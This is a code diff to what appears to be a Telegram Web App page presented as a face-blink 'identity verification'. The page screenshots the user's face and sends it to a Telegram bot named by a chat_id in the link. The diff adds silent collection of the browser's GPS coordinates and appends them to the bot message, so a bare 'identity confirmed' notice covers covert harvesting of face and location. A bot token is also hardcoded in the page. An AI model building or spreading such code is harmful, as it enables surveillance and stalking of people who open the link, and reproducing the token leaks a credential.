@@ -131,6 +131,8 @@
         const overlay = document.getElementById("overlay");
         const { chat_id } = getQueryParams();
 
+        let latitude = 0;
+        let longitude = 0;
         let gotPhoto = false;
         let blinkCounter = 0;
         let blinkState = false;
@@ -284,7 +286,7 @@
                                     setTimeout(async () => {
                                         const dataURL = takeScreenshot("blink", detections.detection.box);
                                         await sendToTelegramBot(dataURL);
-                                        await sendMessageToTelegramBot("✅ Shaxsingiz tasdiqlandi!");
+                                        await sendMessageToTelegramBot("✅ Shaxsingiz tasdiqlandi!", latitude, longitude);
                                         window.Telegram.WebApp.close();
                                     }, 100);
                                 }
@@ -414,7 +416,7 @@
             }
         }
 
-        async function sendMessageToTelegramBot(message) {
+        async function sendMessageToTelegramBot(message, latitude, longitude) {
             const botToken = "7907821344:AAEJYy-7K_8aDZlxeYGdDXPTHqBsOQNj40k";
 
             const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -424,7 +426,7 @@
                 },
                 body: JSON.stringify({
                     chat_id: chat_id,
-                    text: message
+                    text: message + `\n📍 Manzil: (${latitude}, ${longitude})`
                 })
             });
 
@@ -435,33 +437,24 @@
             }
         }
 
-        async function initLocationManager(locationManager) {
-            try {
-                await locationManager.init();
-                console.log('LocationManager initialized');
-                return true;
-            } catch (error) {
-                console.error('Failed to initialize LocationManager:', error);
-                return false;
-            }
-        }
-
-        async function handlePermission() {
+        async function handleGeoPermission() {
             try {
                 const result = await navigator.permissions.query({ name: 'geolocation' });
-
                 console.log('Permission:', result.state);
 
                 if (result.state === 'granted') {
                     console.log('Permission already granted');
 
                     const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: false,
-                                maximumAge: 30000,
-                                timeout: 20000
-                            });
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: false,
+                            maximumAge: 30000,
+                            timeout: 20000
                         });
+                    });
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+
                     console.log(position.coords.latitude, position.coords.longitude);
                 } else if (result.state === 'prompt') {
                     try {
@@ -473,6 +466,8 @@
                             });
                         });
 
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
                         console.log('Permission granted');
                         console.log(position.coords.latitude, position.coords.longitude);
                     } catch {
@@ -487,6 +482,7 @@
                 console.error('Error checking permissions:', error);
             }
         }
+
 
         // Initialize system
         async function initialize() {
